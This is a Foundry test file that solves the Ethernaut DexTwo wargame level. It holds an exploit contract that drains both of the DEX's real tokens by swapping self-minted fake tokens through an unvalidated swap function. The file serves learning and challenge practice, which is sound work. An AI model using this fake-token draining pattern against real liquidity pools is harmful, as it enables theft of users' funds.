// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/23-DexTwo/DexTwo.sol";
import "../src/23-DexTwo/DexTwoFactory.sol";
import "../src/Ethernaut.sol";

contract DexTwoExploit {
    function dexExploit (DexTwo dexContract) public {
        ERC20 token1 = ERC20(dexContract.token1());
        ERC20 token2 = ERC20(dexContract.token2());

        // Create fake tokens as suggested
        SwappableTokenTwo fakeToken1 = new SwappableTokenTwo(address(dexContract), "Fake 1", "FAKE1", 10_000);
        SwappableTokenTwo fakeToken2 = new SwappableTokenTwo(address(dexContract), "Fake 2", "FAKE2", 10_000);

        // Approve the dex to manage all of our token
        token1.approve(address(dexContract), 1000);
        token2.approve(address(dexContract), 1000);
        fakeToken1.approve(address(dexContract), 1000);
        fakeToken2.approve(address(dexContract), 1000);

        // send 1 fake token to the DexTwo to have at least 1 of liquidity
        ERC20(fakeToken1).transfer(address(dexContract), 100);
        ERC20(fakeToken2).transfer(address(dexContract), 100);

        ERC20(fakeToken1).transfer(address(this), 100);
        ERC20(fakeToken2).transfer(address(this), 100);

        // Swap 100 fakeTokens to get 100 real tokens
        dexContract.swap(address(fakeToken1), address(token1), 100);
        dexContract.swap(address(fakeToken2), address(token2), 100);
    }
}

contract DexTwoTest is Test {
    Ethernaut ethernaut;
    address playerAddress = address(6529);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(playerAddress, 3 ether);
    }

    function testDexTwo() public {
        // Level Setup
        DexTwoFactory dexTwoFactory = new DexTwoFactory();
        ethernaut.registerLevel(dexTwoFactory);
        vm.startPrank(playerAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(dexTwoFactory);
        DexTwo ethernautDexTwo = DexTwo(payable(levelAddress));

        // Level Attack
        DexTwoExploit attack = new DexTwoExploit();
        attack.dexExploit(ethernautDexTwo);

        // Level submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
